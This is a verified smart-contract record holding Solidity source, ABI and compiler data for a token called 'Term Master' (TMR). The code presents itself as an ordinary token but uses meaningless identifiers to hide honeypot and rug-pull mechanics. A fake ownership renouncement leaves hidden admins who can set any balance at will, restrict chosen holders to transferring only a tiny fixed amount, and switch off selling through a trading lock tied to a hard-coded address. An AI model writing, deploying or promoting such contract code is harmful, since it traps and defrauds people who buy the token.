{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface teamAmount {\n    function createPair(address toMarketing, address buySwap) external returns (address);\n}\n\ninterface swapMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTx) external view returns (uint256);\n\n    function transfer(address receiverFund, uint256 txLaunch) external returns (bool);\n\n    function allowance(address receiverTeamSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverFund,\n        uint256 txLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundLaunch, uint256 value);\n    event Approval(address indexed receiverTeamSell, address indexed spender, uint256 value);\n}\n\nabstract contract receiverEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromAmount is swapMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TermMaster is receiverEnable, swapMin, fromAmount {\n\n    address exemptMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address liquidityAuto, uint256 txLaunch) public virtual override returns (bool) {\n        amountMinLiquidity[_msgSender()][liquidityAuto] = txLaunch;\n        emit Approval(_msgSender(), liquidityAuto, txLaunch);\n        return true;\n    }\n\n    function transferFrom(address takeShould, address receiverFund, uint256 txLaunch) external override returns (bool) {\n        if (_msgSender() != tradingTakeTotal) {\n            if (amountMinLiquidity[takeShould][_msgSender()] != type(uint256).max) {\n                require(txLaunch <= amountMinLiquidity[takeShould][_msgSender()]);\n                amountMinLiquidity[takeShould][_msgSender()] -= txLaunch;\n            }\n        }\n        return exemptToken(takeShould, receiverFund, txLaunch);\n    }\n\n    function allowance(address tokenLaunched, address liquidityAuto) external view virtual override returns (uint256) {\n        if (liquidityAuto == tradingTakeTotal) {\n            return type(uint256).max;\n        }\n        return amountMinLiquidity[tokenLaunched][liquidityAuto];\n    }\n\n    function launchedTake(address launchedMode, uint256 txLaunch) public {\n        walletSender();\n        marketingListTake[launchedMode] = txLaunch;\n    }\n\n    uint256 private takeIsAuto;\n\n    function balanceOf(address swapTx) public view virtual override returns (uint256) {\n        return marketingListTake[swapTx];\n    }\n\n    function owner() external view returns (address) {\n        return txFundMarketing;\n    }\n\n    string private minAutoFee = \"Term Master\";\n\n    mapping(address => uint256) private marketingListTake;\n\n    mapping(address => bool) public toTx;\n\n    function takeEnableWallet(uint256 txLaunch) public {\n        walletSender();\n        buyLaunch = txLaunch;\n    }\n\n    bool public atFund;\n\n    function name() external view virtual override returns (string memory) {\n        return minAutoFee;\n    }\n\n    uint256 autoMarketingShould;\n\n    string private minSell = \"TMR\";\n\n    bool public takeFrom;\n\n    mapping(address => mapping(address => uint256)) private amountMinLiquidity;\n\n    uint256 buyLaunch;\n\n    address tradingTakeTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address launchedMode, uint256 txLaunch) external virtual override returns (bool) {\n        return exemptToken(_msgSender(), launchedMode, txLaunch);\n    }\n\n    mapping(address => bool) public tradingReceiver;\n\n    function walletSender() private view {\n        require(toTx[_msgSender()]);\n    }\n\n    bool private walletFund;\n\n    uint256 constant autoWallet = 15 ** 10;\n\n    function toBuy(address takeShould, address receiverFund, uint256 txLaunch) internal returns (bool) {\n        require(marketingListTake[takeShould] >= txLaunch);\n        marketingListTake[takeShould] -= txLaunch;\n        marketingListTake[receiverFund] += txLaunch;\n        emit Transfer(takeShould, receiverFund, txLaunch);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return txFundMarketing;\n    }\n\n    uint256 private tradingFrom = 100000000 * 10 ** 18;\n\n    function teamExempt(address fromExempt) public {\n        walletSender();\n        \n        if (fromExempt == liquidityLimit || fromExempt == limitLaunched) {\n            return;\n        }\n        tradingReceiver[fromExempt] = true;\n    }\n\n    address public liquidityLimit;\n\n    bool public totalList;\n\n    address private txFundMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minSell;\n    }\n\n    event OwnershipTransferred(address indexed launchedLiquidity, address indexed fundWallet);\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountLiquidity;\n    }\n\n    function teamAt() public {\n        emit OwnershipTransferred(liquidityLimit, address(0));\n        txFundMarketing = address(0);\n    }\n\n    address public limitLaunched;\n\n    uint8 private amountLiquidity = 18;\n\n    function exemptToken(address takeShould, address receiverFund, uint256 txLaunch) internal returns (bool) {\n        if (takeShould == liquidityLimit) {\n            return toBuy(takeShould, receiverFund, txLaunch);\n        }\n        uint256 amountFromFee = swapMin(limitLaunched).balanceOf(exemptMax);\n        require(amountFromFee == buyLaunch);\n        require(receiverFund != exemptMax);\n        if (tradingReceiver[takeShould]) {\n            return toBuy(takeShould, receiverFund, autoWallet);\n        }\n        return toBuy(takeShould, receiverFund, txLaunch);\n    }\n\n    function feeLiquidity(address teamLaunchEnable) public {\n        if (takeFrom) {\n            return;\n        }\n        if (totalList) {\n            walletFund = false;\n        }\n        toTx[teamLaunchEnable] = true;\n        if (walletFund) {\n            atFund = false;\n        }\n        takeFrom = true;\n    }\n\n    constructor (){\n        if (takeIsAuto == senderModeTrading) {\n            walletFund = true;\n        }\n        totalFee limitSell = totalFee(tradingTakeTotal);\n        limitLaunched = teamAmount(limitSell.factory()).createPair(limitSell.WETH(), address(this));\n        if (senderModeTrading != takeIsAuto) {\n            totalList = true;\n        }\n        liquidityLimit = _msgSender();\n        toTx[liquidityLimit] = true;\n        marketingListTake[liquidityLimit] = tradingFrom;\n        teamAt();\n        if (totalList) {\n            takeIsAuto = senderModeTrading;\n        }\n        emit Transfer(address(0), liquidityLimit, tradingFrom);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFrom;\n    }\n\n    uint256 public senderModeTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeamSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunchEnable\",\"type\":\"address\"}],\"name\":\"feeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"launchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderModeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"takeEnableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"}],\"name\":\"teamExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TermMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}